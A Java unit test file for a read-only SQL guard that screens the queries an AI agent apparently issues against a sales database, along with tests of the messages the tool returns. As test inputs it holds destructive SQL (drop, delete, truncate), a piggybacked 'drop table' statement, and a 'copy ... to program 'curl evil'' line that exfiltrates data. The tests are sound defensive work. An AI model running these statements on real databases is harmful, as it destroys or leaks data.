package io.github.claw4j.capability.builtin.sales;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.dao.DataAccessResourceFailureException;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 销售查询这一层：<b>字符串上拦得住</b> + <b>拦住之后的出口长什么样</b>。
 *
 * <p>两半合在一份文件里，是因为它们守的是同一句话的两面：
 * 规则那半的失效方向是"看起来该拦的没拦"，出口那半的失效方向是
 * "拦住了但模型看不懂为什么"。前者只在模型真的那么写 SQL 时才出现，
 * 后者只在模型被拒之后才开始猜——两种都是"不报错、结果不对"。
 *
 * <p>两半都<b>不需要数据库也不经过模型</b>：执行器是替身，
 * 于是"规则怎么写"与"被拒之后回什么话"都能逐条钉死。
 * 真库上那一层（就算规则漏了也落不了库）由 {@link SalesSqlExecutionTest} 守，
 * 那里红说明规则没接到数据库上，这里红说明规则本身没写。
 */
class SalesQueryTest {

    private static final String GOOD_SQL = "select sum(oi.amount) as amount from business.order_item oi";

    // -------------------------------------------------------------- 字符串层：拦得住

    private static String rejectionOf(String sql) {
        return SalesSqlGuard.rejectionOf(sql).orElse("");
    }

    @Test
    @DisplayName("该放行的不误拒：普通 select、CTE、大小写、尾分号、字面量、注释")
    void 不该拒的不拒() {
        // 误拒的方向是拒绝，不会写坏数据，但会让模型莫名其妙地重试
        assertThat(SalesSqlGuard.rejectionOf("select sum(amount) from business.order_item")).isEmpty();
        assertThat(SalesSqlGuard.rejectionOf("""
                with paid as (select id from business.sales_order where status <> 'CANCELLED')
                select count(*) from paid""")).isEmpty();
        assertThat(SalesSqlGuard.rejectionOf("SELECT 1 FROM business.region;")).isEmpty();
        // 字面量与注释里的关键字不是关键字：字符串层面有，数据库层面没有
        assertThat(SalesSqlGuard.rejectionOf("select 'drop table t' as note from business.region")).isEmpty();
        assertThat(SalesSqlGuard.rejectionOf("select 1 from business.region -- ; drop table t")).isEmpty();
        assertThat(SalesSqlGuard.rejectionOf("/* ; delete from t */ select 1 from business.region")).isEmpty();
    }

    @Test
    @DisplayName("写操作关键字一律拦下，包括改会话与搬数据的")
    void 写操作关键字() {
        assertThat(rejectionOf("delete from business.sales_order")).contains("关键字");
        assertThat(rejectionOf("update business.region set name = 'x'")).contains("关键字");
        assertThat(rejectionOf("insert into business.region values ('w', '西部')")).contains("关键字");
        assertThat(rejectionOf("drop table business.sales_order")).contains("关键字");
        assertThat(rejectionOf("truncate business.order_item")).contains("关键字");
        // set 能关掉约束，copy 能把数据搬出数据库
        assertThat(rejectionOf("set session_replication_role = replica")).contains("关键字");
        assertThat(rejectionOf("copy (select * from business.region) to program 'curl evil'")).contains("关键字");
    }

    @Test
    @DisplayName("可写 CTE 会被拦下：with 开头不等于只读")
    void 可写cte拒绝() {
        // PostgreSQL 允许 with 里做 insert/update/delete 再 returning 出来。
        // 任何"首关键字是 select 或 with 就放行"的规则都会放过它。
        assertThat(rejectionOf("""
                with doomed as (delete from business.sales_order returning *)
                select * from doomed"""))
                .contains("关键字")
                .contains("delete");
    }

    @Test
    @DisplayName("多语句一律拒绝")
    void 多语句拒绝() {
        assertThat(rejectionOf("select 1 from business.region; drop table business.region"))
                .contains("只允许一条语句");
    }

    @Test
    @DisplayName("不以 select / with 开头的都拒绝，空的与 null 也拒绝")
    void 首关键字() {
        assertThat(rejectionOf("values (1)")).contains("只允许以 select 或 with 开头");
        assertThat(rejectionOf("")).contains("语句为空");
        assertThat(SalesSqlGuard.rejectionOf(null)).isPresent();
    }

    @Test
    @DisplayName("行上限是包一层子查询，不去改原句的 limit")
    void 行上限包装() {
        // 拼字符串在原句末尾追加 limit 会在"原句自带 order by limit"时变成语法错误；
        // 包一层对里面写了什么没有要求
        String wrapped = SalesSqlGuard.withRowLimit(
                "select amount from business.order_item order by amount desc limit 10", 51);

        assertThat(wrapped).startsWith("select * from (select amount")
                .endsWith("limit 51")
                .contains("order by amount desc limit 10");

        // 尾部分号必须去掉：它会在子查询里变成语法错误
        assertThat(SalesSqlGuard.withRowLimit("select 1 from business.region;", 51))
                .doesNotContain(";");
    }

    // ------------------------------------------------------------- 出口层：给了什么话

    @Test
    @DisplayName("给定 SQL 返回查到的行")
    void 返回行() {
        RecordingExecutor executor = new RecordingExecutor();

        String result = new SalesTools(executor).querySales(GOOD_SQL);

        assertThat(result).contains("amount").contains("128400.00");
        assertThat(executor.executed).containsExactly(GOOD_SQL);
    }

    @Test
    @DisplayName("越权语句一次都没被执行，且给出的是拒绝而不是空结果")
    void 越权语句不执行() {
        RecordingExecutor executor = new RecordingExecutor();

        String result = new SalesTools(executor).querySales("delete from business.sales_order");

        assertThat(result).startsWith("这条 SQL 没有通过只读校验").contains("delete");
        assertThat(executor.calls()).isZero();
    }

    @Test
    @DisplayName("数据库报错时返回原因，模型才有东西可改")
    void 报错时给原因() {
        ReadOnlySqlExecutor failing = sql -> {
            throw new DataAccessResourceFailureException("column \"amout\" does not exist");
        };

        String result = new SalesTools(failing).querySales(GOOD_SQL);

        assertThat(result).startsWith("这条 SQL 执行失败").contains("does not exist").contains("请修正");
    }

    @Test
    @DisplayName("零行不是失败，但要提醒模型先怀疑口径")
    void 零行返回提示() {
        ReadOnlySqlExecutor empty = sql -> QueryResult.empty();

        String result = new SalesTools(empty).querySales(GOOD_SQL);

        assertThat(result).contains("返回 0 行").contains("east").contains("order_date");
    }

    @Test
    @DisplayName("被截断时明确告知，否则模型会把前 N 行的合计当成全部")
    void 截断要说明() {
        ReadOnlySqlExecutor truncated = sql -> new QueryResult(
                List.of("order_no"), List.of(List.of("SO-1"), List.of("SO-2")), true);

        String result = new SalesTools(truncated).querySales(GOOD_SQL);

        assertThat(result).contains("超过").contains("只给出前").contains("聚合查询");
    }

    /** 记录每一条真正被送进执行器的 SQL，用来证明"被拒的语句根本没走到数据库"。 */
    private static final class RecordingExecutor implements ReadOnlySqlExecutor {

        private final List<String> executed = new ArrayList<>();

        private final AtomicInteger calls = new AtomicInteger();

        @Override
        public QueryResult execute(String sql) {
            executed.add(sql);
            calls.incrementAndGet();
            return new QueryResult(List.of("amount"), List.of(List.of("128400.00")), false);
        }

        int calls() {
            return calls.get();
        }
    }
}
